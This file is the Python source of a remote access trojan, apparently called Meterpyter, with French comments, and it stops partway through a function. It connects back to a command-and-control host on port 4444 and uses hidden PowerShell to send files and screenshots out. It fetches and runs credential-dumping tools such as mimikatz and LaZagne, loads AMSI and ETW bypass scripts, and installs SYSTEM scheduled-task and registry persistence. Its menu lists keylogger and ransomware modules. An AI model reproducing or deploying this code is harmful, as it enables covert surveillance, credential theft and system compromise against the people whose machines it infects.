# ============================================
# IMPORTS
# ============================================

import os 
from os import popen as shell
from cryptography.fernet import Fernet  # Chiffrement pour ransomware
import random
import socket
import subprocess
import platform
import getpass
import threading
import pyautogui  # Capture d'écran
import datetime
from time import sleep
from pynput import keyboard  # Keylogger
from pyperclip import paste  # Récupération du presse-papier
from ctypes import *
import ctypes
import shutil
import paramiko
import signal
import requests  # Communication HTTP pour download/upload
import sys

# ============================================
# CONFIGURATION RÉSEAU
# ============================================

# Buffer de réception
receive = ''

# Socket principal de connexion au serveur C2
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Adresse IP du serveur C2 (Command & Control)
myip = "LHOST_IP" # Change it


# ============================================
# CHEMINS ET PERSISTENCE
# ============================================

# Chemin de l'exécutable (pointe vers .exe si compilé avec PyInstaller)
current_exe_path = sys.executable

# Chemin absolu du script Python original
current_script_path = os.path.abspath(__file__)

# ============================================
# CONNEXION AU SERVEUR C2
# ============================================

# Boucle de reconnexion automatique au serveur C2
while True:
    try:
        s.connect((myip, 4444))
        #s.connect(('myip', 4444))
        break
    except Exception as e:
        print(f"[-] Echec de connexion\n[+] Nouvelle tentative")
        sleep(1)
        pass

# ============================================
# VARIABLES GLOBALES
# ============================================

# Caractère de retour à la ligne encodé pour les envois réseau
chariot = "\n".encode('utf-8')

# Nom d'utilisateur du système actuel
user = getpass.getuser()

# Chemins des répertoires de stockage selon l'OS
if platform.system() == "Linux":
    # Répertoire caché pour screenshots sous Linux
    AppData_Path_Screen = "/home/" + user + "/.local/share/ScreenShots_Dir"
    # Répertoire caché pour keylogs sous Linux
    AppData_Path_Keylog = "/home/" + user + "/.local/share/KeyLogs_Dir"
    AppData_Path_Keylog_File = AppData_Path_Keylog + "/keylogs.txt"
elif platform.system() == "Windows":
    # Répertoire AppData pour screenshots sous Windows
    AppData_Path_Screen = "C:\\Users\\" + user + "\\AppData\\Local\\ScreenShots_Dir"
    # Répertoire AppData pour keylogs sous Windows
    AppData_Path_Keylog = "C:\\Users\\" + user + "\\AppData\\Local\\KeyLogs_Dir"
    AppData_Path_Keylog_File = AppData_Path_Keylog + "/keylogs.txt"

# ============================================
# KEYLOGGER - VARIABLES
# ============================================

# Set des touches actuellement enfoncées
pressed_keys = set()

# Touches modificatrices (Shift, Ctrl, Alt) à tracker
modifier_keys = {
    keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt, keyboard.Key.alt_gr
}

# ============================================
# SUBPROCESS - FLAGS WINDOWS
# ============================================

# Flag pour masquer les fenêtres de subprocess sous Windows
CREATE_NO_WINDOW = 0x08000000 if os.name == "nt" else 0

# Event pour arrêter le keylogger proprement
stop_event = threading.Event()

# ============================================
# PRIVILEGE ESCALATION - TOKENS SYSTEM
# ============================================

# Token SYSTEM dupliqué et stocké globalement pour réutilisation
system_token = None

# Handle du processus SYSTEM source (ne pas fermer)
system_process_handle = None

help_menu = '''
        Available Commands:
            Basic Commands:
                cd <directory> - Change directory
                cat <file> - Read a file (PowerShell)
                exit - Exit the shell
                help - Show this help menu
                clear - Clear the screen (not implemented)

            Post Exploitation commands:
                Recon & Discovery:
                    sysinfo - Get system information
                    arpscan - Scan local network for devices (not implemented)
                    netstat or netstat <kind> - Show network connections (kind: inet, inet4, inet6, tcp, tcp4, tcp6, udp, udp4, udp6, unix)
                    listlocalusers (not implemented)
                    listdomainusers (not implemented)
                    portscanning local/remote <target_ip> <start_port> <end_port> - Scan ports on local or remote target (not implemented)
                    
                File Operations:
                    search <path> <filename>/<dirname> - Search for a file or directory by name
                    download <filepath> <port> - Download a file from the target 
                    upload <filepath> <port> - Upload a file to the target 
                    zipdownload <filepath> <port> - upload a directory from user session

                Persistence Mechanisms:
                    addschedule - Add a persistence scheduled task (using tasks planner for Windows)
                    addstartup - Add a startup entry (using regedit run key for Windows)

                Process & Service Management:
                    ps - List running processes
                    kill <pid> - Kill a process by PID (not implemented)
                    dump <pid> - Dump process memory (not implemented)
                    migrate <pid> - Migrate to another process (not implemented)

                Credential Dump:
                    lsadump - Dump LSA secrets
                    samdump - Dump SAM database (not implemented)
                    dumpnav - Dump Edge/Chrome/Firefox/... passwords (not implemented)
    
                Privilege Escalation:
                    getprivs - Attempt to enable all privileges
                    getsystem - Attempt to elevate privileges to SYSTEM
                    whoami - check current user privileges (Display if SYSTEM for debugging)

                External Modules Management:
                    Module options :
                        - mimikatz
                        - powersploit
                        - rubeus
                        - lazagne
                        - kekeo
                        - amsi
                        - etw
                    Loading External Modules:
                        loadmodule <module_name> - Load an external module (Try to download from attacker web server)
                        loadmodule all - Load all external modules
                    Unloading External Modules:
                        removemodule <module_name> - Remove an external module
                        removemodule all - Remove all external modules
                    Running loaded Modules: 
                        runmodule <module> - Run a loaded module

                User Control:
                    getscreen - Capture and send a screenshot
                    startkeylogger - Start keylogger
                    stopkeylogger - Stop keylogger
                    av on/off - Enable/disable antivirus (not implemented)
                    fw on/off - Enable/disable firewall (not implemented)

                Ransomware Module:
                    startransomware or startransomware <path> - Start ransomware encryption
                    stopransomware or stopransomware <path> - Stop ransomware encryption

                Open Terminal
                    powershell - Open a PowerShell terminal
                    cmd - Open a CMD terminal (Windows only) (not implemented)

                Default CMD commands:
                    winget 
        '''

# ============================================
# FONCTIONS - RECONNAISSANCE SYSTÈME
# ============================================

# Récupère et envoie les informations système (OS, hostname, version, etc.)
def Get_SysInfo():
    sysinfo = ''
    uname = platform.uname()
    sysinfo += f'Operating System: {uname.system}\n'
    sysinfo += f'Hostname: {uname.node}\n'
    sysinfo += f'OS Version: {uname.version}\n'
    sysinfo += f'Release: {uname.release}\n'
    sysinfo += f'Machine Type: {uname.machine}\n'
    sysinfo += f'Processor Info: {uname.processor}\n'
    sysinfo += f'Current User: {getpass.getuser()}\n'
    sysinfo += f'Current Directory: {os.getcwd()}\n'
    s.send(chariot + sysinfo.encode('utf-8') + chariot)

# Lit et envoie le contenu d'un fichier texte
def Read_File(filepath):
    try:
        with open(filepath, 'r') as file:
            content = file.read()
        s.send(chariot + content.encode('utf-8') + chariot)
    except Exception as e:
        s.send(chariot + f'Error reading file: {str(e)}'.encode('utf-8') + chariot)

# ============================================
# FONCTIONS - NETWORK SCANNING
# ============================================

# Détermine le protocole (TCP/UDP) d'une connexion
def Proto_of(conn):
    if conn.type == socket.SOCK_STREAM:
        return "TCP"
    elif conn.type == socket.SOCK_DGRAM:
        return "UDP"
    return "?"

# Formate une adresse réseau en IP:Port
def fmt_addr(addr):
    if not addr:
        return ""
    ip, port = addr
    return f"{ip}:{port}"

# Liste toutes les connexions réseau actives avec filtrage par type (TCP/UDP/IPv4/IPv6)
def NetStat(kind="inet"):
    import psutil

    rows = []
    for c in psutil.net_connections(kind=kind):
        rows.append({
            "Protocol": Proto_of(c),
            "Local Address": fmt_addr(c.laddr),
            "Foreign Address": fmt_addr(c.raddr),
            "Status": c.status,
            "PID": c.pid,
            "Process": psutil.Process(c.pid).name() if c.pid else ""

        })

    for row in rows:
        line = "{Protocol: <6} {Local Address: <22} {Foreign Address: <22} {Status: <13} {PID: <7} {Process}".format(**row)
        s.send(chariot + line.encode('utf-8'))

# ============================================
# FONCTIONS - TRANSFERT DE FICHIERS
# ============================================

# Télécharge un fichier depuis le serveur C2 via HTTP
def Download_File(filename):

    s.send(chariot + f"[DOWNLOAD] Downloading file {filename}...\n".encode('utf-8') + chariot)
    payload = f"""
    $filename = "{os.path.basename(filename)}"
    $destination = "$(Get-Location)/" + $filename
    $url = "http://{myip}/download/" + $filename
    Invoke-WebRequest -Uri $url -OutFile $destination
    """
    results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
    output = results.stdout.read() + results.stderr.read()
    s.send(f"[DOWNLOAD] File {filename} download completed.\n".encode('utf-8') + chariot)

# Upload un fichier vers le serveur C2 via HTTP PUT
def Upload_File(path_to_upload):

    s.send(chariot + f"[UPLOAD] Uploading file {os.path.basename(path_to_upload)}...\n".encode('utf-8') + chariot)
    payload = f"""
    $filename = "{os.path.basename(path_to_upload)}"
    $path = "{path_to_upload}"
    $url = "http://{myip}/upload/" + $filename
    Invoke-WebRequest -Uri $url -Method Put -InFile $path
    """
    results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
    output = results.stdout.read() + results.stderr.read()
    s.send(f"[UPLOAD] File {os.path.basename(path_to_upload)} upload completed.\n".encode('utf-8') + chariot)    

# Compresse un fichier ou répertoire en ZIP puis l'upload (optimise les gros fichiers comme lsass.dmp)
def ZIP_Upload(path_to_compress):

    s.send(chariot + f"[ZIPUPLOAD] Compressing and uploading {os.path.basename(path_to_compress)}...\n".encode('utf-8') + chariot)
    # Déterminer si c'est un fichier ou un répertoire
    if os.path.isfile(path_to_compress):
        # Pour un fichier: compresser directement le fichier
        compress_path = f'"{path_to_compress}"'
        # Le .zip aura le même nom que le fichier (sans extension originale)
        base_name = os.path.splitext(os.path.basename(path_to_compress))[0]
    elif os.path.isdir(path_to_compress):
        # Pour un répertoire: compresser tout son contenu
        compress_path = f'"{path_to_compress}\\*"'
        base_name = os.path.basename(path_to_compress)
    else:
        s.send(chariot + f"[ZIPUPLOAD] Error: Path not found: {path_to_compress}\n".encode('utf-8') + chariot)
        return
    
    # Chemin du fichier zip de destination
    zip_destination = os.path.join(os.path.dirname(path_to_compress) or ".", f"{base_name}.zip")
    
    payload = f"""
    $sourcePath = {compress_path}
    $zipPath = "{zip_destination}"
    $filename = "{base_name}.zip"
    if (Test-Path $zipPath) {{ Remove-Item $zipPath -Force }}
    Compress-Archive -Path $sourcePath -DestinationPath $zipPath -CompressionLevel Optimal
    $url = "http://{myip}/upload/" + $filename
    Invoke-WebRequest -Uri $url -Method Put -InFile $zipPath
    Remove-Item $zipPath -Force
    """
    
    results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
    output = results.stdout.read() + results.stderr.read()
    s.send(f"[ZIPUPLOAD] Zip {base_name}.zip upload completed.\n".encode('utf-8') + chariot)

# ============================================
# FONCTIONS - UTILITAIRES
# ============================================

# Envoie une séquence ANSI pour nettoyer l'écran du terminal distant
# Clear Screen function 
def Clear_Screen():
    """Send an ANSI clear-screen escape sequence back to the controller so
    the controller's terminal is cleared instead of the target's terminal.
    """
    # ANSI: clear screen (J) and move cursor to home (H)
    escape = '\x1b[2J\x1b[H'.encode('utf-8')
    try:
        s.send(chariot + escape + chariot)
    except Exception:

        # Fallback: send a plain message prompting the operator to clear
        s.send(chariot + b"[CLEAR]\n" + chariot)

# ============================================
# SIGNAL HANDLERS
# ============================================

# Gestionnaire pour CTRL+C et SIGTERM - ferme proprement la connexion
# Handle CTRL+C and SIGTERM to stop the script
def handle_exit(signum, frame):
    print("\n[!] Script stopped by user (signal: {}), exiting...".format(signum))
    try:
        s.close()
    except Exception:
        pass
    exit(0)

# Enregistrement des gestionnaires de signaux pour arrêt propre
signal.signal(signal.SIGINT, handle_exit)   # CTRL+C
signal.signal(signal.SIGTERM, handle_exit)  # kill/terminate

# ============================================
# FONCTIONS - RECHERCHE FICHIERS
# ============================================

# Recherche récursive de fichiers/répertoires par nom avec coloration
def Search_File(pathtosearch, filedirname):
    s.send(chariot + f"Searching for '{filedirname}' in '{pathtosearch}'...\n".encode('utf-8'))
    matches = []
    filedirname = filedirname.lower()
    for root, dirs, files in os.walk(pathtosearch):
        for dir in dirs:
            if filedirname in dir.lower():
                colored_dir = dir.replace(filedirname, f'\033[91m{filedirname}\033[0m')
                full_path = os.path.join(root, colored_dir)
                matches.append(full_path)
        for file in files:
            if filedirname in file.lower():
                colored_file = file.replace(filedirname, f'\033[91m{filedirname}\033[0m')
                full_path = os.path.join(root, colored_file)
                matches.append(full_path)
    if matches:
        for match in matches:
            s.send(f"Found: {match}\n".encode('utf-8'))
    else:
        s.send(chariot + f"No matches found for '{filedirname}' in '{pathtosearch}'.\n".encode('utf-8'))
    s.send(chariot)

# ============================================
# FONCTIONS - GESTION MODULES EXTERNES
# ============================================

# Télécharge et installe des modules externes (mimikatz, powersploit, rubeus, etc.)
def Load_Module(module_name):
    current_path = os.getcwd()
    if module_name == "all":
        s.send(chariot + f"[LOADMODULE] Loading ALL modules...\n".encode('utf-8'))
        Load_Module("mimikatz")
        Load_Module("powersploit")
        Load_Module("rubeus")
        Load_Module("lazagne")
        Load_Module("kekeo")
        Load_Module("amsi")
        Load_Module("etw")
        s.send(chariot + b"[LOADMODULE] All modules loaded.\n" + chariot)
    elif module_name == "mimikatz":
        global mimikatztodelete, mimikatztoexecute
        mimikatztodelete = current_path + "\\mimikatz"
        mimikatztoexecute = current_path + "\\mimikatz\\x64\\mimikatz.exe"
        payload = """
        $url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
        $destination = "$(get-location)/mimikatz.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/mimikatz"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] Mimikatz module loaded.\n" + chariot)
    elif module_name == "powersploit":
        global powersploittodelete, powersplittoexecute
        powersploittodelete = current_path + "\\PowerSploit"
        powersplittoexecute = current_path + "\\PowerSploit\\PowerSploit.psm1"
        payload = """
        $url = "https://github.com/PowerShellMafia/PowerSploit/archive/refs/tags/v3.0.0.zip"
        $destination = "$(get-location)/PowerSploit.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/PowerSploit"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] PowerSploit module loaded.\n" + chariot)
    elif module_name == "rubeus":
        global rubeustodelete, rubeustoexecute
        rubeustodelete = current_path + "\\Rubeus"
        rubeustoexecute = current_path + "\\Rubeus\\Rubeus.exe"
        payload = f"""
        $url = "http://{myip}/download/Rubeus.zip"
        $destination = "$(get-location)/Rubeus.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/Rubeus"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] Rubeus module loaded.\n" + chariot)
    elif module_name == "lazagne":
        global lazagnetodelete, lazagnetoexecute
        lazagnetodelete = current_path + "\\LaZagne"
        lazagnetoexecute = current_path + "\\LaZagne\\LaZagne.exe"
        payload = f"""
        $url = "http://{myip}/download/LaZagne.zip"
        $destination = "$(get-location)/LaZagne.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/LaZagne"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] LaZagne module loaded.\n" + chariot)
    elif module_name == "kekeo":
        global kekeotodelete, kekeotoexecute
        kekeotodelete = current_path + "\\Kekeo"
        kekeotoexecute = current_path + "\\Kekeo\\kekeo.exe"
        payload = f"""
        $url = "http://{myip}/download/Kekeo.zip"
        $destination = "$(get-location)/Kekeo.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/Kekeo"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] Kekeo module loaded.\n" + chariot)
    elif module_name == "amsi":
        global amsitodelete, amsitoexecute
        amsitodelete = current_path + "\\amsibypass.ps1"
        amsitoexecute = current_path + "\\amsibypass.ps1"
        payload = f"""
        $url = "http://{myip}/download/amsibypass.ps1"
        $destination = "$(get-location)/amsibypass.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] AMSI Bypass module loaded.\n" + chariot)
    elif module_name == "etw":
        global etwtodelete, etwtoexecute
        etwtodelete = current_path + "\\etwbypass.ps1"
        etwtoexecute = current_path + "\\etwbypass.ps1"
        payload = f"""
        $url = "http://{myip}/download/etwbypass.ps1"
        $destination = "$(get-location)/etwbypass.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] ETW Bypass module loaded.\n" + chariot)

# Supprime les modules externes précédemment téléchargés
def Remove_Module(module_name):
    s.send(chariot + f"Removing ALL modules...\n".encode('utf-8'))
    if module_name == "all":
        shutil.rmtree(mimikatztodelete, ignore_errors=True)
        shutil.rmtree(powersploittodelete, ignore_errors=True)
        shutil.rmtree(rubeustodelete, ignore_errors=True)
        shutil.rmtree(lazagnetodelete, ignore_errors=True)
        shutil.rmtree(kekeotodelete, ignore_errors=True)
        os.remove(amsitodelete)
        os.remove(etwtodelete)
        s.send(chariot + b"[REMOVEMODULE] All modules removed.\n" + chariot)
    elif module_name == "mimikatz":
        shutil.rmtree(mimikatztodelete, ignore_errors=True)
        s.send(chariot + b"[REMOVEMODULE] Mimikatz module removed.\n" + chariot)
    elif module_name == "powersploit":
        shutil.rmtree(powersploittodelete, ignore_errors=True)
        s.send(chariot + b"[REMOVEMODULE] PowerSploit module removed.\n" + chariot)
    elif module_name == "rubeus":
        shutil.rmtree(rubeustodelete, ignore_errors=True)
        s.send(chariot + b"[REMOVEMODULE] Rubeus module removed.\n" + chariot)
    elif module_name == "lazagne":
        shutil.rmtree(lazagnetodelete, ignore_errors=True)
        s.send(chariot + b"[REMOVEMODULE] LaZagne module removed.\n" + chariot)
    elif module_name == "kekeo":
        shutil.rmtree(kekeotodelete, ignore_errors=True)
        s.send(chariot + b"[REMOVEMODULE] Kekeo module removed.\n" + chariot)
    elif module_name == "amsi":
        os.remove(amsitodelete)
        s.send(chariot + b"[REMOVEMODULE] AMSI Bypass module removed.\n" + chariot)
    elif module_name == "etw":
        os.remove(etwtodelete)
        s.send(chariot + b"[REMOVEMODULE] ETW Bypass module removed.\n" + chariot)

# Exécute un module externe chargé (sessions interactives pour mimikatz/kekeo)
def Run_Module(module_name):
    current_path = os.getcwd()
    if module_name == "mimikatz":
        exe_path = mimikatztoexecute
        if not exe_path or not os.path.isfile(exe_path):
            s.send(f"[!] mimikatz.exe introuvable. Charge d'abord le module.\n".encode('utf-8'))
            return

        s.send(chariot + b"[mimikatz] Demarrage de la session interactive...\n")
        s.send(b"[mimikatz] Tape 'exit' pour quitter la session et revenir au shell.\n")

        try:
            proc = subprocess.Popen(
                [exe_path],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, 
                shell=False,
                bufsize=0,                  
                universal_newlines=False,   
                creationflags=CREATE_NO_WINDOW
            )
        except Exception as e:
            s.send(f"[mimikatz] Echec de lancement: {e}\n".encode('utf-8', 'replace'))
            return

        stop_evt = threading.Event()

        def pump_stdout():
            try:
                while not stop_evt.is_set():
                    chunk = proc.stdout.read(1024)
                    if not chunk:
                        break
                    try:
                        s.send(chunk)
                    except Exception:
                        break
            except Exception:
                pass

        t_out = threading.Thread(target=pump_stdout, daemon=True)
        t_out.start()

        try:
            while True:

                if proc.poll() is not None:
                    break

                data = s.recv(4096)
                if not data:
                    sleep(0.05)
                    continue

                try:
                    text = data.decode('utf-8', 'replace')
                except Exception:
                    text = ''

                if text.strip().lower() == "exit":
                    try:
                        proc.stdin.write(b"exit\r\n")
                        proc.stdin.flush()
                    except Exception:
                        pass
                    # on attend un court instant la fin du process
                    try:
                        proc.wait(timeout=3)
                    except Exception:
                        pass
                    break

                norm = text.replace('\r\n', '\n').replace('\r', '\n').replace('\n', '\r\n').encode('utf-8', 'replace')
                try:
                    proc.stdin.write(norm)
                    proc.stdin.flush()
                except BrokenPipeError:
                    break
                except Exception:
                    pass

        finally:
            stop_evt.set()
            try:
                t_out.join(timeout=1.0)
            except Exception:
                pass
            try:
                if proc.poll() is None:
                    proc.terminate()
            except Exception:
                pass

        s.send(b"\n[MIMIKATZ] Session interactive terminee. Retour au shell.\n" + chariot)
    elif module_name == "powersploit":
        s.send(b"[POWERSPLOIT] Execution non implementee.\n")
    elif module_name == "rubeus":
        s.send(b"[RUBEUS] Execution non implementee.\n")
    elif module_name == "lazagne":
        s.send(chariot + b"[LAZAGNE] Running LaZagne to retrieve stored passwords...\n")
        if lazagnetoexecute is not None:
            results = subprocess.Popen([lazagnetoexecute, "all"], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output = results.stdout.read() + results.stderr.read()
            s.send(chariot + output + chariot)
    elif module_name == "kekeo":
        exe_path = kekeotoexecute
        if not exe_path or not os.path.isfile(exe_path):
            s.send(f"[!] kekeo.exe introuvable. Charge d'abord le module.\n".encode('utf-8'))
            return

        s.send(chariot + b"[KEKEO] Demarrage de la session interactive...\n")
        s.send(b"[KEKEO] Tape 'exit' pour quitter la session et revenir au shell.\n")

        try:
            proc = subprocess.Popen(
                [exe_path],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, 
                shell=False,
                bufsize=0,                  
                universal_newlines=False,   
                creationflags=CREATE_NO_WINDOW
            )
        except Exception as e:
            s.send(f"[KEKEO] Echec de lancement: {e}\n".encode('utf-8', 'replace'))
            return

        stop_evt = threading.Event()

        def pump_stdout():
            try:
                while not stop_evt.is_set():
                    chunk = proc.stdout.read(1024)
                    if not chunk:
                        break
                    try:
                        s.send(chunk)
                    except Exception:
                        break
            except Exception:
                pass

        t_out = threading.Thread(target=pump_stdout, daemon=True)
        t_out.start()

        try:
            while True:

                if proc.poll() is not None:
                    break

                data = s.recv(4096)
                if not data:
                    sleep(0.05)
                    continue

                try:
                    text = data.decode('utf-8', 'replace')
                except Exception:
                    text = ''

                if text.strip().lower() == "exit":
                    try:
                        proc.stdin.write(b"exit\r\n")
                        proc.stdin.flush()
                    except Exception:
                        pass
                    # on attend un court instant la fin du process
                    try:
                        proc.wait(timeout=3)
                    except Exception:
                        pass
                    break

                norm = text.replace('\r\n', '\n').replace('\r', '\n').replace('\n', '\r\n').encode('utf-8', 'replace')
                try:
                    proc.stdin.write(norm)
                    proc.stdin.flush()
                except BrokenPipeError:
                    break
                except Exception:
                    pass

        finally:
            stop_evt.set()
            try:
                t_out.join(timeout=1.0)
            except Exception:
                pass
            try:
                if proc.poll() is None:
                    proc.terminate()
            except Exception:
                pass

        s.send(b"\n[KEKEO] Session interactive terminee. Retour au shell.\n" + chariot)
    elif module_name == "amsi":
        s.send(chariot + b"[AMSIBYPASS] Running AMSI Bypass in current PowerShell session...\n")
        if amsitoexecute is not None:
            payload = f"""$path = "{amsitoexecute}";& $path"""
            if powershell_proc and powershell_proc.poll() is None:
                try:
                    powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                    powershell_proc.stdin.flush()
                except Exception as e:
                    s.send(f"[AMSIBYPASS] Error: {e}\n".encode('utf-8'))
            else:
                s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")
        else:
            payload = f"""$path = "{current_path}\\amsibypass.ps1";& $path"""
            if powershell_proc and powershell_proc.poll() is None:
                try:
                    powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                    powershell_proc.stdin.flush()
                except Exception as e:
                    s.send(f"[AMSIBYPASS] Error: {e}\n".encode('utf-8'))
            else:
                s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")
        s.send(chariot + b"[AMSIBYPASS] AMSI Bypass done.\n" + chariot)
    elif module_name == "etw":
        s.send(chariot + b"[ETWBYPASS] Running ETW Bypass...\n")
        if etwtoexecute is not None:
            payload = f"""$path = "{etwtoexecute}";& $path"""
            if powershell_proc and powershell_proc.poll() is None:
                try:
                    powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                    powershell_proc.stdin.flush()
                except Exception as e:
                    s.send(f"[ETWBYPASS] Error: {e}\n".encode('utf-8'))
            else:
                s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")
        else:
            payload = f"""$path = "{current_path}\\etwbypass.ps1";& $path"""
            if powershell_proc and powershell_proc.poll() is None:
                try:
                    powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                    powershell_proc.stdin.flush()
                except Exception as e:
                    s.send(f"[ETWBYPASS] Error: {e}\n".encode('utf-8'))
            else:
                s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")
        s.send(chariot + b"[ETWBYPASS] ETW Bypass done.\n" + chariot)

# ============================================
# FONCTIONS - SURVEILLANCE UTILISATEUR
# ============================================

# Capture un screenshot de l'écran de la victime et l'upload
def Take_Screenshot(AppData_Path_Screen):
    sleep(1)
    s.send(chariot + b"[SCREENSHOT] Taking screenshot of victim screen...\n")
    filename = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".png"
    if not os.path.exists(AppData_Path_Screen):
        os.makedirs(AppData_Path_Screen)
    filepath = os.path.join(AppData_Path_Screen, filename)
    screenshot = pyautogui.screenshot(filepath)
    s.send(f"[SCREENSHOT] Screenshot saved to {filepath}\n".encode('utf-8'))
    Upload_File(filepath)

# ============================================
# FONCTIONS - PERSISTENCE
# ============================================

# Ajoute une tâche planifiée pour exécuter le RAT au démarrage (SYSTEM)
def Add_Scheduled():
    s.send(chariot + b"[ADDSCHEDULE] Adding scheduled task..." + chariot)
    user = getpass.getuser()
    path_to_persistence = "C:\\Users\\" + user + "\\Downloads"
    url = f"http://{myip}/download/Meterpyter.exe"
    destination = path_to_persistence + "\\Meterpyter.exe"
    payload = f'''
    $cmd = @"
Invoke-WebRequest -Uri {url} -OutFile {destination} -UseBasicParsing;
Start-Process -FilePath {destination}
"@

    # Encodage UTF-16LE -> Base64 pour -EncodedCommand
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
    $enc   = [Convert]::ToBase64String($bytes)

    $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $enc"
    $trigger   = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

    Register-ScheduledTask -TaskName "METERPYTER_PERSISTENCE" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
    '''

    results = subprocess.Popen(
        ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
        stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
    )
    s.send(b"[ADDSCHEDULE] Scheduled task added." + chariot + chariot)

# Ajoute une entrée dans la clé de registre Run pour persistence utilisateur
def Add_Startup():
    s.send(chariot + b"[ADDSTARTUP] Adding startup entry... (Not implemented)" + chariot)
    Regedit_Path = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    user = os.getlogin()
    path_to_persistence = "C:\\Users\\" + user + "\\Downloads"
    url = f"http://{myip}/download/Meterpyter.exe"
    destination = path_to_persistence + "\\Meterpyter.exe"
    payload = f"""    
    Invoke-WebRequest -Uri {url} -OutFile {destination}
    Set-ItemProperty -Path "{Regedit_Path}" -Name "METERPYTER_PERSISTENCE" -Value "{destination}"
    """
    results = subprocess.Popen(
        ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
